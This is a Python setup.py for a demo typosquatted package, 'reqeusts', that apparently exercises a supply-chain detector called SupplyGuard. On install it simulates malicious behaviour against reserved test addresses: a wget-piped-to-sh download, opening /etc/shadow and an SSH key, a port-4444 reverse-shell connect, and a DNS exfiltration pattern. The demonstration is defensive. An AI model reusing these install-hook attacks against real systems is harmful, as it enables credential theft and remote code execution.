"""데모용 '타이포스쿼팅' 패키지 — reqeusts (requests 의 오타).

이 패키지는 SupplyGuard 탐지를 시연하기 위한 무해한 시뮬레이션이다. 실제 공급망 공격이
설치 단계(post-install)에서 흔히 하는 행동을 흉내만 낸다. 아무것도 실제로 하지 않는다:
  - 원격 코드를 내려받거나 실행하지 않는다 (도메인은 TEST-NET·예약 대역이라 연결 불가).
  - 파일을 밖으로 보내지 않는다. 존재 여부만 확인하려고 열어 보고 즉시 닫는다.
  - 목적지는 RFC 5737 TEST-NET(203.0.113.0/24, 라우팅되지 않음)과 IANA 예약 도메인
    example.com(문서용, 연결만 하고 데이터는 보내지 않음)뿐이다.
  - TEST-NET 목적지는 접속이 실패할 때(타임아웃 약 3초 뒤) connect 이벤트가 나와 격리도 그 뒤에
    일어난다. 실제로 도달 가능한 서버면 즉시 나온다.

pip 이 이 setup.py 를 실행하는 순간, 커널의 openat/execve/connect 시스템콜을 SupplyGuard 가
가로채 정책에 걸어 컨테이너를 격리한다. sg-install 로 감시 컨테이너 안에서만 실행하라:
    sg-install pip ./deploy/demo/reqeusts

시나리오는 SG_DEMO_SCENARIOS 로 고른다(쉼표 구분, 기본 all, 기존 순서 유지):
    SG_DEMO_SCENARIOS=all | shell | revshell | direct-ip | domain | dns-exfil | udp
각 시나리오는 시작 전에 "[demo] <id> start" 를 찍어 로그로 시각을 맞출 수 있게 한다.
"""
import os
import socket
import subprocess
import sys

BANNER = "[demo] typosquatted package 'reqeusts' post-install (harmless simulation)"


def touch(path):
    # 민감 파일 '접근' 시늉 — 열려고 시도만 하고, 내용은 읽지도 보내지도 않는다. openat 탐지를 유발한다.
    try:
        open(path, "rb").close()
        print(f"[demo]   opened {path} (SupplyGuard should flag this)")
    except OSError as e:
        print(f"[demo]   open {path} failed harmlessly: {e.__class__.__name__}")


def scn_shell():
    # execve — '외부 스크립트 실행' 패턴 + openat — 자격 증명·계정 파일 접근 시늉.
    # 셸에서 다운로더를 부르는 형태 자체가 no-shell-download / pipe-to-shell 에, 파일 접근은
    # sensitive-files / sandbox-secrets 에 걸린다. 실제로는 예약 대역이라 아무것도 받지 못한다.
    print("[demo] shell start")
    subprocess.run(
        ["sh", "-c", "wget -q -O- http://203.0.113.7/postinstall.sh | sh"],
        timeout=3,
        check=False,
    )
    for p in ("/etc/shadow", "/root/.ssh/id_rsa"):
        touch(p)


def scn_revshell():
    # connect — 리버스 셸에 흔한 포트(4444)로 아웃바운드. TEST-NET 이라 타임아웃난다. reverse-shell-ports.
    print("[demo] revshell start")
    try:
        socket.create_connection(("203.0.113.7", 4444), timeout=2).close()
    except OSError:
        print("[demo]   connect 203.0.113.7:4444 timed out harmlessly (TEST-NET)")


def scn_direct_ip():
    # connect — DNS 조회 없이 IP 로 바로 443 접속. sandbox-egress(directIp: kill)/runtime-direct-ip(alert) 시연용.
    print("[demo] direct-ip start")
    try:
        socket.create_connection(("203.0.113.7", 443), timeout=2).close()
    except OSError:
        print("[demo]   connect 203.0.113.7:443 (no DNS) timed out harmlessly (TEST-NET)")


def scn_domain():
    # 도메인 기반 연결 — IANA 예약 도메인 example.com:443 (실제로 해석되므로 목적지에 도메인이 붙는다).
    # 차단 목록(도메인)에 example.com 을 올린 뒤 실행하면 blocklist-hosts 에 걸리고, 올리기 전에는 정상 통과.
    print("[demo] domain start")
    try:
        socket.create_connection(("example.com", 443), timeout=3).close()
        print("[demo]   example.com:443 connected")
    except OSError as e:
        print(f"[demo]   example.com:443 {e.__class__.__name__}")


def scn_dns_exfil():
    # DNS 질의로 데이터를 실어 보내는 패턴 흉내 — 48자 hex 라벨을 예약 TLD(.example, RFC 2606) 아래로 조회.
    # 예약 TLD 라 NXDOMAIN 이고 아무 데이터도 나가지 않는다. 이어서 TXT 질의 1개를 컨테이너의 네임서버로 보낸다.
    # runtime-dns-exfil(라벨 40자 초과 · TXT) / sandbox-dns(허용 목록 밖 도메인) 시연용.
    print("[demo] dns-exfil start")
    label = "deadbeef" * 6  # 48자 — 유출 데이터를 흉내 낸 가짜 hex
    name = f"{label}.exfil.example"
    try:
        socket.getaddrinfo(name, 443)
        print(f"[demo]   resolved {name} (unexpected)")
    except OSError as e:
        print(f"[demo]   dns query {name} -> {e.__class__.__name__} (NXDOMAIN expected, harmless)")
    ns = "127.0.0.11"
    try:
        with open("/etc/resolv.conf") as f:
            for line in f:
                if line.startswith("nameserver"):
                    ns = line.split()[1]
                    break
    except OSError:
        pass
    # TXT 질의 1개(RFC 1035 와이어 포맷): id 0x1337 · RD · QNAME data.exfil.example · QTYPE TXT · QCLASS IN
    q = (b"\x13\x37\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
         b"\x04data\x05exfil\x07example\x00\x00\x10\x00\x01")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.settimeout(1)
        s.sendto(q, (ns, 53))
        s.recv(512)
    except OSError as e:
        print(f"[demo]   txt query data.exfil.example -> {ns}:53 {e.__class__.__name__}")
    finally:
        s.close()
    print("[demo]   txt query data.exfil.example sent (harmless, reserved TLD)")


def scn_udp():
    # UDP 비컨 — 203.0.113.7:53·4444 로 데이터그램 2개 전송(응답 기다리지 않음).
    # 엔진은 TCP 와 DNS(53 · 5353)만 관찰 — 일반 UDP 는 보이지 않는 음성 대조군. 이벤트에 뜨지 않아야 정상.
    print("[demo] udp start")
    print("[demo]   NEGATIVE CONTROL: 일반 UDP 는 엔진에 보이지 않는다 — TCP 와 DNS(53 · 5353)만 관찰 (이벤트 미탐이 정상)")
    for port in (53, 4444):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"beacon", ("203.0.113.7", port))  # 응답을 기다리지 않는다
            s.close()
            print(f"[demo]   udp sent 203.0.113.7:{port}")
        except OSError as e:
            print(f"[demo]   udp send 203.0.113.7:{port} failed harmlessly: {e.__class__.__name__}")


SCENARIOS = [
    ("shell", scn_shell),
    ("revshell", scn_revshell),
    ("direct-ip", scn_direct_ip),
    ("domain", scn_domain),
    ("dns-exfil", scn_dns_exfil),
    ("udp", scn_udp),
]


def main():
    print(BANNER)
    want = os.environ.get("SG_DEMO_SCENARIOS", "all").strip()
    selected = {s.strip() for s in want.split(",") if s.strip()}
    run_all = ("all" in selected) or not selected
    ran = False
    for name, fn in SCENARIOS:  # 기존 순서 유지
        if run_all or name in selected:
            fn()
            ran = True
    if not ran:
        print(f"[demo] no matching scenario in SG_DEMO_SCENARIOS={want!r} "
              "(use all|shell|revshell|direct-ip|domain|dns-exfil|udp)")
        return
    print("[demo] done — 정상 설치라면 여기 도달하지만, SupplyGuard 는 shell 시나리오에서 이미 격리한다.")


if __name__ == "__main__":
    main()

# pip install 시 실행되도록: 최소 메타데이터. 실제 배포 목적이 아니다.
try:
    from setuptools import setup
    if "install" in sys.argv or "bdist_wheel" in sys.argv or "egg_info" in sys.argv:
        main()  # post-install 흉내: 빌드/설치 단계에서 위 행동을 유발
        setup(name="reqeusts", version="1.0.2", py_modules=[])
except ImportError:
    pass
